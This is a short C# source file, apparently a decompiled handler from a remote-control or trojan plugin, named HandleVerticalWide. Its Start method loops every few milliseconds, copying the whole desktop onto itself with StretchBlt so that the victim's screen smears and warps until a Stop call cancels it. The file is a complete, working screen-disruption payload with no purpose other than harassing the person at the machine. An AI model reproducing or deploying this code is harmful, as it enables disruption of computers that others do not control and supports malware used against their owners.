using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleVerticalWide
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			while (!ctsStop.IsCancellationRequested)
			{
				IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				NativeMethods.StretchBlt(dC, 0, -20, width, height + 40, dC, 0, 0, width, height, 13369376u);
				NativeMethods.ReleaseDC(IntPtr.Zero, dC);
				Thread.Sleep(4);
			}
		}
	}

	public static void Stop()
	{
		if (!ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
